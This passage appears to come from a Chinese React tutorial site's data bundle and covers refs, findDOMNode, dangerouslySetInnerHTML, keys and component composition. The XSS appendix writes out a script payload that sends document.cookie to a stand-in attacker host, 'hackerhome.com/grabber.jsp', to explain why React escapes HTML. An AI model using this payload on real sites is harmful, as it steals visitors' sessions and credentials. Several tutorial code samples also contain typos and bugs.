获取DOM元素\n\n获取DOM节点的引用,我们可以通过以下两种方式获取：\n\n * refs\n * ReactDOM.findDOMNode()\n\n\n# Refs\n\nRefs 提供了一种方式，用于访问在 render 方法中创建的 DOM 节点或 React 元素。\n\n下面是几个适合使用 refs 的情况：\n\n * 处理焦点、文本选择或媒体控制。\n * 触发强制动画。\n * 集成第三方 DOM 库\n\n如果可以通过声明式实现，则尽量避免使用 refs。\n\n> 注意：不能在函数式组件上使用 ref 属性。\n\nRefs使用方式有三种类型：\n\n * String 类型的 Refs [旧版API] (不推荐使用)\n * 回调 Refs\n * React.createRef()API[v16.3]。\n\n\n# String 类型的 Refs\n\n> 注意：不建议使用，已过时并可能会在未来的版本被移除.\n\nreact可以允许我们通过 ref 来定位一个组件。具体的做法是： 先给一个组件设置一个 ref='xxx' 的属性，注意这个ref的值必须是全局唯一的。\n\nclass Test extends React.Component{\n    handleInput(){\n        //拿到的是虚拟DOM\n        var input = this.refs.city;\n        alert(input.value)\n    }\n    render(){\n        return (<div>\n            <input ref='city' />\n            <button onClick={this.handleInput.bind(this)}>获取Input文本</button>\n        </div>);\n    }\n    componentDidMount(){\n        //componentDidMount是在render方法后执行 拿到的是原生DOM元素\n        var input = this.refs.city;\n        input.focus(); //获取焦点\n    }\n}\n\n\n\n> 注意：可以通过 this.refs.city 来访问这个组件，组件为装载未完成，这里拿到的只是虚拟DOM。\n\n> 注意：只有在render方法执行之后，并且react已经完成了DOM的更新，才能通过 this.refs.city 来拿到原生的DOM元素。\n\n\n# 回调 Refs\n\nref属性接收一个回调函数，这个回调函数在组件挂载或者卸载的时候被调用。 当ref用于一个HTML元素的时候，ref指定的回调函数在调用的时候会接收一个参数，该参数就是指定的DOM元素。\n\nref={ el => this.textInput = el }\n\n\n如下面的例子使用ref回调函数来保存对DOM节点的引用：\n\nclass TextInput extends React.Component{\n    constructor(props){\n        super(props);\n        this.FocusTextInput = null;\n    }\n    handleFocus(){\n        this.FocusTextInput.focus();\n    }\n    render(){\n        return <div>\n            <input type=\"text\" ref={el=>this.FocusTextInput = el} />\n            <button onClick={this.handleFocus.bind(this)}>获取焦点</button>\n        </div>\n    }\n}\n\n\n\n# React.createRef()\n\n使用 React.createRef() 创建 refs，通过 ref 属性来获得 React 元素。当构造组件时，refs 通常被赋值给实例的一个属性，这样你可以在组件中任意一处使用它们.\n\nclass TextInput extends React.Component {\n    constructor(props) {\n        super(props);\n        this.textInput = React.createRef();\n    }\n    render() {\n        return <input ref={this.textInput} />;\n    }\n    componentDidMount(){\n        //divDOM\n        var div = this.textInput.current\n    }\n}\n\n\n当一个 ref 属性被传递给一个 render 函数中的元素时，可以使用 ref 中的 current 属性对节点的引用进行访问。\n\nconst node = this.textInput.current;\n\n\nReact 会在组件加载时将 DOM 元素传入 current 属性，在卸载时则会改回 null。ref 的更新会发生在componentDidMount 或 componentDidUpdate 生命周期钩子之前。\n\n示例：\n\nclass TextInput extends React.Component{\n    constructor(props){\n        super(props);\n        this.FocusTextInput = React.createRef();\n    }\n    handleFocus(){\n        this.FocusTextInput.current.focus();\n    }\n    render(){\n        return <div>\n            <input type=\"text\" ref={this.FocusTextInput} />\n            <button onClick={this.handleFocus.bind(this)}>获取焦点</button>\n        </div>\n    }\n}\n\n\n\n# findDOMNode\n\n当组件渲染到页面上之后(mounted)，你都可以通过 react-dom 提供的 findDOMNode() 方法拿到组件对应的 DOM 元素。\n\nReactDOM.findDOMNode(component);\n\n\n> 注意：component 为当前组件 this.findDOMNode() 只能用于组件已经被渲染到DOM中情况。\n\n示例：\n\nclass Test extends React.Component{\n\tconstructor(props){\n\t\tsuper(props);\n\t\tthis.el = null;\n\t\tthis.handleClick = this.handleClick.bind(this);\n\t}\n\trender(){\n\t\treturn <div>\n\t\t\t<input type=\"text\" />\n\t\t\t<button>获取焦点</button>\n\t\t</div>\n\t}\n\thandleClick(){\n\t\tvar input = this.el.querySelector('input[type=text]');\n\t\tinput.focus();\n\t}\n\tcomponentDidMount(){\n\t\tthis.el = ReactDOM.findDOMNode(this);\n\t\tvar button = this.el.querySelector('button');\n\t\tbutton.addEventListener('click',this.handleClick)\n\t}\n}\n",normalizedContent:"# dom 操作\n\n多数情况下，react的虚拟dom足以满足我们的需求，不需要直接操作底层真实的dom。通过将组件组合使用，满足我们的需求。\n\n在某些特殊情况下，为了某些需求不得不去操作底层的dom。最常见的场景使用一些插件、或要执行一个react没有支持的操作。\n\n\n# 获取dom元素\n\n获取dom节点的引用,我们可以通过以下两种方式获取：\n\n * refs\n * reactdom.finddomnode()\n\n\n# refs\n\nrefs 提供了一种方式，用于访问在 render 方法中创建的 dom 节点或 react 元素。\n\n下面是几个适合使用 refs 的情况：\n\n * 处理焦点、文本选择或媒体控制。\n * 触发强制动画。\n * 集成第三方 dom 库\n\n如果可以通过声明式实现，则尽量避免使用 refs。\n\n> 注意：不能在函数式组件上使用 ref 属性。\n\nrefs使用方式有三种类型：\n\n * string 类型的 refs [旧版api] (不推荐使用)\n * 回调 refs\n * react.createref()api[v16.3]。\n\n\n# string 类型的 refs\n\n> 注意：不建议使用，已过时并可能会在未来的版本被移除.\n\nreact可以允许我们通过 ref 来定位一个组件。具体的做法是： 先给一个组件设置一个 ref='xxx' 的属性，注意这个ref的值必须是全局唯一的。\n\nclass test extends react.component{\n    handleinput(){\n        //拿到的是虚拟dom\n        var input = this.refs.city;\n        alert(input.value)\n    }\n    render(){\n        return (<div>\n            <input ref='city' />\n            <button onclick={this.handleinput.bind(this)}>获取input文本</button>\n        </div>);\n    }\n    componentdidmount(){\n        //componentdidmount是在render方法后执行 拿到的是原生dom元素\n        var input = this.refs.city;\n        input.focus(); //获取焦点\n    }\n}\n\n\n\n> 注意：可以通过 this.refs.city 来访问这个组件，组件为装载未完成，这里拿到的只是虚拟dom。\n\n> 注意：只有在render方法执行之后，并且react已经完成了dom的更新，才能通过 this.refs.city 来拿到原生的dom元素。\n\n\n# 回调 refs\n\nref属性接收一个回调函数，这个回调函数在组件挂载或者卸载的时候被调用。 当ref用于一个html元素的时候，ref指定的回调函数在调用的时候会接收一个参数，该参数就是指定的dom元素。\n\nref={ el => this.textinput = el }\n\n\n如下面的例子使用ref回调函数来保存对dom节点的引用：\n\nclass textinput extends react.component{\n    constructor(props){\n        super(props);\n        this.focustextinput = null;\n    }\n    handlefocus(){\n        this.focustextinput.focus();\n    }\n    render(){\n        return <div>\n            <input type=\"text\" ref={el=>this.focustextinput = el} />\n            <button onclick={this.handlefocus.bind(this)}>获取焦点</button>\n        </div>\n    }\n}\n\n\n\n# react.createref()\n\n使用 react.createref() 创建 refs，通过 ref 属性来获得 react 元素。当构造组件时，refs 通常被赋值给实例的一个属性，这样你可以在组件中任意一处使用它们.\n\nclass textinput extends react.component {\n    constructor(props) {\n        super(props);\n        this.textinput = react.createref();\n    }\n    render() {\n        return <input ref={this.textinput} />;\n    }\n    componentdidmount(){\n        //divdom\n        var div = this.textinput.current\n    }\n}\n\n\n当一个 ref 属性被传递给一个 render 函数中的元素时，可以使用 ref 中的 current 属性对节点的引用进行访问。\n\nconst node = this.textinput.current;\n\n\nreact 会在组件加载时将 dom 元素传入 current 属性，在卸载时则会改回 null。ref 的更新会发生在componentdidmount 或 componentdidupdate 生命周期钩子之前。\n\n示例：\n\nclass textinput extends react.component{\n    constructor(props){\n        super(props);\n        this.focustextinput = react.createref();\n    }\n    handlefocus(){\n        this.focustextinput.current.focus();\n    }\n    render(){\n        return <div>\n            <input type=\"text\" ref={this.focustextinput} />\n            <button onclick={this.handlefocus.bind(this)}>获取焦点</button>\n        </div>\n    }\n}\n\n\n\n# finddomnode\n\n当组件渲染到页面上之后(mounted)，你都可以通过 react-dom 提供的 finddomnode() 方法拿到组件对应的 dom 元素。\n\nreactdom.finddomnode(component);\n\n\n> 注意：component 为当前组件 this.finddomnode() 只能用于组件已经被渲染到dom中情况。\n\n示例：\n\nclass test extends react.component{\n\tconstructor(props){\n\t\tsuper(props);\n\t\tthis.el = null;\n\t\tthis.handleclick = this.handleclick.bind(this);\n\t}\n\trender(){\n\t\treturn <div>\n\t\t\t<input type=\"text\" />\n\t\t\t<button>获取焦点</button>\n\t\t</div>\n\t}\n\thandleclick(){\n\t\tvar input = this.el.queryselector('input[type=text]');\n\t\tinput.focus();\n\t}\n\tcomponentdidmount(){\n\t\tthis.el = reactdom.finddomnode(this);\n\t\tvar button = this.el.queryselector('button');\n\t\tbutton.addeventlistener('click',this.handleclick)\n\t}\n}\n",charsets:{cjk:!0}},{title:"React元素属性",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/05-React%E5%85%83%E7%B4%A0%E5%B1%9E%E6%80%A7.html",relativePath:"React/React基础/05-React元素属性.md",key:"v-8d632b36",path:"/React/React%E5%9F%BA%E7%A1%80/05-React%E5%85%83%E7%B4%A0%E5%B1%9E%E6%80%A7.html",headers:[{level:2,title:"dangerouslySetInnerHTML属性",slug:"dangerouslysetinnerhtml属性",normalizedTitle:"dangerouslysetinnerhtml属性",charIndex:72},{level:2,title:"key",slug:"key",normalizedTitle:"key",charIndex:63},{level:3,title:"key的值要稳定唯一",slug:"key的值要稳定唯一",normalizedTitle:"key的值要稳定唯一",charIndex:1552},{level:2,title:"附录",slug:"附录",normalizedTitle:"附录",charIndex:1710},{level:3,title:"cross-site scripting(XSS)攻击",slug:"cross-site-scripting-xss-攻击",normalizedTitle:"cross-site scripting(xss)攻击",charIndex:1717}],headersStr:"dangerouslySetInnerHTML属性 key key的值要稳定唯一 附录 cross-site scripting(XSS)攻击",content:"# React元素属性\n\nJSX中有3个常用的非DOM属性，分别是: dangerouslySetInnerHTML、ref、key。\n\n\n# dangerouslySetInnerHTML属性\n\n在JSX中直接插入HTML代码，但是如果能避免使用这个 属性则尽量避免使用。\n\n滥用innerHTML 可能会导致 cross-site scripting (XSS) 攻击。\n\n我们的设计哲学是让确保安全应该是简单的，开发者在执行“不安全”的操作的时候应该清楚地知道他们自己的意图。dangerouslySetInnerHTML 这个 prop 的命名是故意这么设计的，以此来警告，它的 prop 值（ 一个对象而不是字符串 ）应该被用来表明净化后的数据。\n\n如果服务端在接口上已经对html进行了转义，并且可以完全信任服务端的接口数据，可以使用dangerouslySetInnerHTML。\n\nvar a = {__html:'<a href=\"http://www.baidu.com\">百度一下</a>'};\n\nclass Link extends React.Component{\n    render(){\n        return <div dangerouslySetInnerHTML={this.props.html}></div>\n    }\n}\n\nReactDOM.render(<Link html={a}/>,document.querySelector('#box'));\n\n\n\n# key\n\nkey是一个可选的唯一标识符，通过给组件设置一个独 一无二的键，并确保它在一个渲染周期中保持一致，使得 React能够更只能地决定应该重用一个组件还是销毁并重 建一个组件，进而提高渲染性能。\n\nclass List extends React.Component{\n    constructor(props){\n        super(props);\n        this.state = {\n            val:['king','hi','lilei','lucy']\n        };\n    }\n    render(){\n        var ls = function(v){\n            return v.map(function(a,i){\n                return <li key={i}>{a}</li>\n            })\n        }\n        return (\n            <ul>{ls(this.state.val)}</ul>\n        )\n    }\n}\n\nReactDOM.render(<List/>,document.querySelector('#app'))\n\n\n由数组创建的子组件必须有key属性，否则的话你可能见到下面这样的warning：\n\n> Warning: Each child in an array or iterator should have a unique \"key\" prop. Check the render method of ServiceInfo. See https://fb.me/react-warning-keys for more information.\n\n可能你会发现，这只是warning而不是error，它不是强制性的，为什么react不强制要求用key而报error呢？其实是强制要求的，只不过react为按要求来默认上帮我们做了，它是以数组的index作为key的。\n\n\n# key的值要稳定唯一\n\n在数组中生成的每项都要有key属性，并且key的值是一个永久且唯一的值，即稳定唯一。\n\n在理想情况下，在循环一个对象数组时，数组的每一项都会有用于区分其他项的一个键值，相当数据库中主键。这样就可以用该属性值作为key值。但是一般情况下可能是没有这个属性值的，这时就需要我们自己保证。\n\n\n# 附录\n\n\n# cross-site scripting(XSS)攻击\n\nXSS攻击全称跨站脚本攻击,是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。\n\n让我们首先了解XSS攻击到底是怎样完成的。\n\n就以一个博客应用为例。其常常需要允许读者对博主的文章进行评论。在输入评论的编辑栏中，我们可以输入对该文章的评论，也可以输入以下HTML标记：\n\n<Script>alert(“XSS attack available!”);<\/Script>\n\n\n在读者按下提交键之后，该标记将被提交到服务器上，并在其它用户访问时作为评论显示。此时该用户所看到网页中包含该标记的部分元素可能为：\n\n<div>\n    <Script>alert(“XSS attack available!”);<\/Script>\n</div>\n\n\n而从用户的角度来看，该网页中就出现了一个警告。\n\n也就是说，用户输入的脚本语言已经被用户的浏览器成功执行。当然，这可能只是一个对该网站的善意提醒。但是对于一个真正具有恶意的攻击者，其所插入的脚本代码更可能如下所示：\n\n<script>document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg='+document.cookie+'width=16 height=16 border=0 />');<\/script>\n\n\n该段脚本将向当前评论内插入一个图片，而该图片所对应的URL则指向了hackerhome中的JSP页面grabber.jsp。从访问该评论的用户这一角度看来，其仅仅是一个不能显示的图片。但是对于恶意攻击者而言，该JSP页面将自动记录传入的msg参数内容，即访问评论用户所使用的cookie。该cookie可能包含用户的敏感信息，甚至是用户名，密码等重要信息。\n\n所以，react的做法是不直接读取你的html代码，以此来避免cross-site scripting (XSS)攻击，让你的代码更加安全",normalizedContent:"# react元素属性\n\njsx中有3个常用的非dom属性，分别是: dangerouslysetinnerhtml、ref、key。\n\n\n# dangerouslysetinnerhtml属性\n\n在jsx中直接插入html代码，但是如果能避免使用这个 属性则尽量避免使用。\n\n滥用innerhtml 可能会导致 cross-site scripting (xss) 攻击。\n\n我们的设计哲学是让确保安全应该是简单的，开发者在执行“不安全”的操作的时候应该清楚地知道他们自己的意图。dangerouslysetinnerhtml 这个 prop 的命名是故意这么设计的，以此来警告，它的 prop 值（ 一个对象而不是字符串 ）应该被用来表明净化后的数据。\n\n如果服务端在接口上已经对html进行了转义，并且可以完全信任服务端的接口数据，可以使用dangerouslysetinnerhtml。\n\nvar a = {__html:'<a href=\"http://www.baidu.com\">百度一下</a>'};\n\nclass link extends react.component{\n    render(){\n        return <div dangerouslysetinnerhtml={this.props.html}></div>\n    }\n}\n\nreactdom.render(<link html={a}/>,document.queryselector('#box'));\n\n\n\n# key\n\nkey是一个可选的唯一标识符，通过给组件设置一个独 一无二的键，并确保它在一个渲染周期中保持一致，使得 react能够更只能地决定应该重用一个组件还是销毁并重 建一个组件，进而提高渲染性能。\n\nclass list extends react.component{\n    constructor(props){\n        super(props);\n        this.state = {\n            val:['king','hi','lilei','lucy']\n        };\n    }\n    render(){\n        var ls = function(v){\n            return v.map(function(a,i){\n                return <li key={i}>{a}</li>\n            })\n        }\n        return (\n            <ul>{ls(this.state.val)}</ul>\n        )\n    }\n}\n\nreactdom.render(<list/>,document.queryselector('#app'))\n\n\n由数组创建的子组件必须有key属性，否则的话你可能见到下面这样的warning：\n\n> warning: each child in an array or iterator should have a unique \"key\" prop. check the render method of serviceinfo. see https://fb.me/react-warning-keys for more information.\n\n可能你会发现，这只是warning而不是error，它不是强制性的，为什么react不强制要求用key而报error呢？其实是强制要求的，只不过react为按要求来默认上帮我们做了，它是以数组的index作为key的。\n\n\n# key的值要稳定唯一\n\n在数组中生成的每项都要有key属性，并且key的值是一个永久且唯一的值，即稳定唯一。\n\n在理想情况下，在循环一个对象数组时，数组的每一项都会有用于区分其他项的一个键值，相当数据库中主键。这样就可以用该属性值作为key值。但是一般情况下可能是没有这个属性值的，这时就需要我们自己保证。\n\n\n# 附录\n\n\n# cross-site scripting(xss)攻击\n\nxss攻击全称跨站脚本攻击,是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。\n\n让我们首先了解xss攻击到底是怎样完成的。\n\n就以一个博客应用为例。其常常需要允许读者对博主的文章进行评论。在输入评论的编辑栏中，我们可以输入对该文章的评论，也可以输入以下html标记：\n\n<script>alert(“xss attack available!”);<\/script>\n\n\n在读者按下提交键之后，该标记将被提交到服务器上，并在其它用户访问时作为评论显示。此时该用户所看到网页中包含该标记的部分元素可能为：\n\n<div>\n    <script>alert(“xss attack available!”);<\/script>\n</div>\n\n\n而从用户的角度来看，该网页中就出现了一个警告。\n\n也就是说，用户输入的脚本语言已经被用户的浏览器成功执行。当然，这可能只是一个对该网站的善意提醒。但是对于一个真正具有恶意的攻击者，其所插入的脚本代码更可能如下所示：\n\n<script>document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg='+document.cookie+'width=16 height=16 border=0 />');<\/script>\n\n\n该段脚本将向当前评论内插入一个图片，而该图片所对应的url则指向了hackerhome中的jsp页面grabber.jsp。从访问该评论的用户这一角度看来，其仅仅是一个不能显示的图片。但是对于恶意攻击者而言，该jsp页面将自动记录传入的msg参数内容，即访问评论用户所使用的cookie。该cookie可能包含用户的敏感信息，甚至是用户名，密码等重要信息。\n\n所以，react的做法是不直接读取你的html代码，以此来避免cross-site scripting (xss)攻击，让你的代码更加安全",charsets:{cjk:!0}},{title:"React组件组合",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/09-React%E7%BB%84%E4%BB%B6%E7%BB%84%E5%90%88.html",relativePath:"React/React基础/09-React组件组合.md",key:"v-e085a9a0",path:"/React/React%E5%9F%BA%E7%A1%80/09-React%E7%BB%84%E4%BB%B6%E7%BB%84%E5%90%88.html",headers:[{level:2,title:"组件嵌套",slug:"组件嵌套",normalizedTitle:"组件嵌套",charIndex:271},{level:3,title:"组件嵌套写法",slug:"组件嵌套写法",normalizedTitle:"组件嵌套写法",charIndex:533},{level:2,title:"组件组合",slug:"组件组合",normalizedTitle:"组件组合",charIndex:7},{level:3,title:"提交留言表单组件",slug:"提交留言表单组件",normalizedTitle:"提交留言表单组件",charIndex:1285},{level:3,title:"留言展示列表组件",slug:"留言展示列表组件",normalizedTitle:"留言展示列表组件",charIndex:1310},{level:3,title:"留言组件",slug:"留言组件",normalizedTitle:"留言组件",charIndex:1337},{level:2,title:"组件包含",slug:"组件包含",normalizedTitle:"组件包含",charIndex:3635}],headersStr:"组件嵌套 组件嵌套写法 组件组合 提交留言表单组件 留言展示列表组件 留言组件 组件包含",content:'# React组件组合\n\n> 组合本质上是对组件的一种组织、管理方式，实现代码的封装.\n\n在传统HTML当中，html元素是构成页面的基本单元。但在React中，在React中构建页面的基本单元是React组件。整个React应用都是用组件组合来构建的。\n\n本质上，一个组件就是一个Javascript函数，它接受属性(props)和状态（state）作为参数，并输出渲染好的HTML。组件一般被用来呈现和表达应用的某部分数据，因此你可以把React组件理解为HTML元素的扩展。\n\nReact推崇通过组合的方式来组织大规模的应用。\n\n\n# 组件嵌套\n\n在父组件中嵌套子组件和引用HTML标签一样：\n\n\t<子组件名> ... </子组件名> //双标签\n\t<子组件名 /> //单标签\n\n\n所谓父子组件，就和DOM中的父子元素一样，他们是有从属关系\n\n注意：render中return的HTML标签都必须有个最外层的标签包裹。\n\nfunction Test (Props){\n\treturn (<div> 代码….. <div>);          # 正确\n\treturn (<div>1</div><div>2</div>);     # 错误\n}\n\n\n\n# 组件嵌套写法\n\n# 正确写法\n\nclass Children extends React.Component{\n\trender(){\n\t\treturn ( //有最外层的标签包裹\n            <div>i am from Children</div>\n            )\n\t}\n}\nclass Parent extends React.Component{\n\trender(){\n\t\treturn ( //子组件必须包裹在一个HTML标签内\n            <div>\n                <Children fromParent={} />\n            </div>\n            )\n\t}\n}\n\n\n# 错误写法\n\n//错误1： 两个div没有包含在一个HTML标签内\nclass Children extends React.Component{\n\trender(){\n        return (\n            <div>Others </div>\n            <div>i am from Children</div>\n            )\n    }\n}\n//错误2：子组件没有包含在一个HTML标签内\nclass Parent extends React.Component{\n\trender(){\n        return(\n            <Children fromParent={} />\n            )\n    }\n})\n\n\n\n# 组件组合\n\n接下来我们先通过一个留言板的示例为大家展示组件的组合使用。 留言板分为以下几个组件：\n\n 1. CommentFrom 提交留言表单组件\n 2. CommentList 留言展示列表组件\n 3. CommentItem 一条留言组件\n 4. CommentBox 留言组件\n\n\n# 提交留言表单组件\n\n留言板我们会有提交留言的表单组件，该组件我们叫做CommentFrom，我们在此处结合React部分约束表单来写该示例：\n\nclass CommentFrom extends React.Component{\n    constuctor(props){\n        super(props);\n        this.state = {\n            name:\'\',\n            val:\'\'\n        }\n    }\n    render(){\n        return (<div>\n                <div>\n                    <span>姓名：</span>\n                    <input type="text" value={this.state.value} onChange={this.handleInputChange.bind(this)} />\n                </div>\n                <div>\n                    <span>留言：</span>\n                    <textarea value={this.state.val} onChange={this.handleTextareaChange.bind(this)}/>\n                </div>\n                <div>\n                    <button onClick={this.handleSubmit.bind(this)}>提交</button>\n                </div>\n            </div>)\n    }\n    handleTextareaChange(e){\n        //在此处我们处理一下该数据，清除开始于结束的所有空格\n        var val = e.target.value.repalce(/^\\s+|\\s+$/,\'\');\n        this.setState({\n            val:val\n        })\n    }\n    handleInputChange(e){\n        this.setState({\n            name:e.target.value\n        })\n    }\n    handleSubmit(){\n        return {name:this.state.name,val:this.state.val};\n    }\n}\n\n\n\n\n# 留言展示列表组件\n\n留言展示列表组件，在该组件中我们主要有2个组件，一个是单条留言组件，一个是留言列表组件。留言展示组件是由多个单条留言组成，在此处我们会初步进行一次组合使用。\n\n//一条留言组件\nclass CommentItem extends React.Component{\n    render(){\n        return <div>\n            {/*姓名*/}\n            <span>{this.props.data.name}</span>\n\n            {/*留言内容*/}\n            <span>{this.props.data.val}</span>\n        </div>\n    }\n}\n\n//留言列表组件\nclass CommentList extends React.Component{\n    render(){\n        return (<div>\n        {/*在此处我们将一条留言组件在该组件中进行了组合，类似html的标签嵌套*/}\n                {this.props.list.map((item,index)=>{\n                        <CommentItem data={item} key={index}/>\n                })}\n            </div>)\n    }\n}\n\n\n\n# 留言组件\n\n留言组件就是一个容器组件，用来组合 提交留言表单组件 与 留言展示列表组件。\n\nclass CommentBox extends React.Component{\n    render(){\n        return (<div>\n                <CommentList/>\n                <CommentFrom/>\n            </div>)\n    }\n}\n\n//将该留言渲染到指定标签中\nReactDOM.render(<CommentBox/>,document.querySelector(\'#box\'))\n\n\n通过以上的例子，我们不难发现React组件组合其实与HTML标签的嵌套类似。在做开发的过程中，最重要的是拆分组件，往往拆分组件对于初次接触React的初学者而言是比较困难的，根据组件的目的来明确为什么要写该组件，组件的目的是为了复用，因此我们可以根据该思想来确定哪些组件需要拆分组合使用。\n\n\n# 组件包含\n\n通过上面留言板的例子，大家已经掌握了React的基本开发思想，为了更好的应用组件的组合，接下来，我们再介绍一个中更为巧妙的组合方式。\n\n在我们开发组件过程中，往往我们不知道组件中的具体的内容是什么，只有在使用的时候才能明确其中的内容。例如： 在需求中，我们经常会用到Button按钮组件，但是有一些需求是组件中只需要出现文字，而有些需要出现图标与文字。\n\n//注册按钮 只要文字\n<Button>注册</Button>\n\n//添加按钮需要添加图标结合文字\n<Button><Icon type="add" />添加</Button>\n\n//删除按钮只需要删除图标\n<Button><Icon type="del"/></Button>\n\n\n这种类型的组合类似我们有一个html标签，标签中的内容是在我们使用标签的时候去决定。这种类型的组件我们需要借助this.props.children属性来实现。\n\nclass Button extends React.Component{\n    render(){\n        return <button>{this.props.children}</button>\n    }\n}\n\n<Button>注册</Button> //当我们在Button组件中写入注册，那么对应的组件中this.props.children就是“注册”\n<Button><Icon type="add" />添加</Button> //这种情况下 this.props.children 就是 <Icon type="add" />添加\n\n\n我们完成一个面板组件(Panel)，面板有标题，还有内容。但是内容我们不知道用户要放置什么，因此我们可以采用组件包含来完成该组件的设计。\n\nclass Panel extends React.Component{\n    render(){\n        return (<div className="panel">\n            <h3 className="panel-title">{this.props.title}</h3>\n            <div className="panel-body">\n            {this.props.children}\n            </div>\n        </div>);\n    }\n}\n\n//当前Panel中放置的内容为一个列表\n<Panel title="用户列表">\n    <ul>\n        <li>张三</li>\n        <li>李四</li>\n        <li>王武</li>\n    </ul>\n</Panel>\n\n//当前panel中放置的内容为一段文本\n<Panel title="激励的句子">\n    <p>不是因为看到希望而去做，是做了才有希望</p>\n</Panel>\n',normalizedContent:'# react组件组合\n\n> 组合本质上是对组件的一种组织、管理方式，实现代码的封装.\n\n在传统html当中，html元素是构成页面的基本单元。但在react中，在react中构建页面的基本单元是react组件。整个react应用都是用组件组合来构建的。\n\n本质上，一个组件就是一个javascript函数，它接受属性(props)和状态（state）作为参数，并输出渲染好的html。组件一般被用来呈现和表达应用的某部分数据，因此你可以把react组件理解为html元素的扩展。\n\nreact推崇通过组合的方式来组织大规模的应用。\n\n\n# 组件嵌套\n\n在父组件中嵌套子组件和引用html标签一样：\n\n\t<子组件名> ... </子组件名> //双标签\n\t<子组件名 /> //单标签\n\n\n所谓父子组件，就和dom中的父子元素一样，他们是有从属关系\n\n注意：render中return的html标签都必须有个最外层的标签包裹。\n\nfunction test (props){\n\treturn (<div> 代码….. <div>);          # 正确\n\treturn (<div>1</div><div>2</div>);     # 错误\n}\n\n\n\n# 组件嵌套写法\n\n# 正确写法\n\nclass children extends react.component{\n\trender(){\n\t\treturn ( //有最外层的标签包裹\n            <div>i am from children</div>\n            )\n\t}\n}\nclass parent extends react.component{\n\trender(){\n\t\treturn ( //子组件必须包裹在一个html标签内\n            <div>\n                <children fromparent={} />\n            </div>\n            )\n\t}\n}\n\n\n# 错误写法\n\n//错误1： 两个div没有包含在一个html标签内\nclass children extends react.component{\n\trender(){\n        return (\n            <div>others </div>\n            <div>i am from children</div>\n            )\n    }\n}\n//错误2：子组件没有包含在一个html标签内\nclass parent extends react.component{\n\trender(){\n        return(\n            <children fromparent={} />\n            )\n    }\n})\n\n\n\n# 组件组合\n\n接下来我们先通过一个留言板的示例为大家展示组件的组合使用。 留言板分为以下几个组件：\n\n 1. commentfrom 提交留言表单组件\n 2. commentlist 留言展示列表组件\n 3. commentitem 一条留言组件\n 4. commentbox 留言组件\n\n\n# 提交留言表单组件\n\n留言板我们会有提交留言的表单组件，该组件我们叫做commentfrom，我们在此处结合react部分约束表单来写该示例：\n\nclass commentfrom extends react.component{\n    constuctor(props){\n        super(props);\n        this.state = {\n            name:\'\',\n            val:\'\'\n        }\n    }\n    render(){\n        return (<div>\n                <div>\n                    <span>姓名：</span>\n                    <input type="text" value={this.state.value} onchange={this.handleinputchange.bind(this)} />\n                </div>\n                <div>\n                    <span>留言：</span>\n                    <textarea value={this.state.val} onchange={this.handletextareachange.bind(this)}/>\n                </div>\n                <div>\n                    <button onclick={this.handlesubmit.bind(this)}>提交</button>\n                </div>\n            </div>)\n    }\n    handletextareachange(e){\n        //在此处我们处理一下该数据，清除开始于结束的所有空格\n        var val = e.target.value.repalce(/^\\s+|\\s+$/,\'\');\n        this.setstate({\n            val:val\n        })\n    }\n    handleinputchange(e){\n        this.setstate({\n            name:e.target.value\n        })\n    }\n    handlesubmit(){\n        return {name:this.state.name,val:this.state.val};\n    }\n}\n\n\n\n\n# 留言展示列表组件\n\n留言展示列表组件，在该组件中我们主要有2个组件，一个是单条留言组件，一个是留言列表组件。留言展示组件是由多个单条留言组成，在此处我们会初步进行一次组合使用。\n\n//一条留言组件\nclass commentitem extends react.component{\n    render(){\n        return <div>\n            {/*姓名*/}\n            <span>{this.props.data.name}</span>\n\n            {/*留言内容*/}\n            <span>{this.props.data.val}</span>\n        </div>\n    }\n}\n\n//留言列表组件\nclass commentlist extends react.component{\n    render(){\n        return (<div>\n        {/*在此处我们将一条留言组件在该组件中进行了组合，类似html的标签嵌套*/}\n                {this.props.list.map((item,index)=>{\n                        <commentitem data={item} key={index}/>\n                })}\n            </div>)\n    }\n}\n\n\n\n# 留言组件\n\n留言组件就是一个容器组件，用来组合 提交留言表单组件 与 留言展示列表组件。\n\nclass commentbox extends react.component{\n    render(){\n        return (<div>\n                <commentlist/>\n                <commentfrom/>\n            </div>)\n    }\n}\n\n//将该留言渲染到指定标签中\nreactdom.render(<commentbox/>,document.queryselector(\'#box\'))\n\n\n通过以上的例子，我们不难发现react组件组合其实与html标签的嵌套类似。在做开发的过程中，最重要的是拆分组件，往往拆分组件对于初次接触react的初学者而言是比较困难的，根据组件的目的来明确为什么要写该组件，组件的目的是为了复用，因此我们可以根据该思想来确定哪些组件需要拆分组合使用。\n\n\n# 组件包含\n\n通过上面留言板的例子，大家已经掌握了react的基本开发思想，为了更好的应用组件的组合，接下来，我们再介绍一个中更为巧妙的组合方式。\n\n在我们开发组件过程中，往往我们不知道组件中的具体的内容是什么，只有在使用的时候才能明确其中的内容。例如： 在需求中，我们经常会用到button按钮组件，但是有一些需求是组件中只需要出现文字，而有些需要出现图标与文字。\n\n//注册按钮 只要文字\n<button>注册</button>\n\n//添加按钮需要添加图标结合文字\n<button><icon type="add" />添加</button>\n\n//删除按钮只需要删除图标\n<button><icon type="del"/></button>\n\n\n这种类型的组合类似我们有一个html标签，标签中的内容是在我们使用标签的时候去决定。这种类型的组件我们需要借助this.props.children属性来实现。\n\nclass button extends react.component{\n    render(){\n        return <button>{this.props.children}</button>\n    }\n}\n\n<button>注册</button> //当我们在button组件中写入注册，那么对应的组件中this.props.children就是“注册”\n<button><icon type="add" />添加</button> //这种情况下 this.props.children 就是 <icon type="add" />添加\n\n\n我们完成一个面板组件(panel)，面板有标题，还有内容。但是内容我们不知道用户要放置什么，因此我们可以采用组件包含来完成该组件的设计。\n\nclass panel extends react.component{\n    render(){\n        return (<div classname="panel">\n            <h3 classname="panel-title">{this.props.title}</h3>\n            <div classname="panel-body">\n            {this.props.children}\n            </div>\n        </div>);\n    }\n}\n\n//当前panel中放置的内容为一个列表\n<panel title="用户列表">\n    <ul>\n        <li>张三</li>\n        <li>李四</li>\n        <li>王武</li>\n    </ul>\n</panel>\n\n//当前panel中放置的内容为一段文本\n<panel title="激励的句子">\n    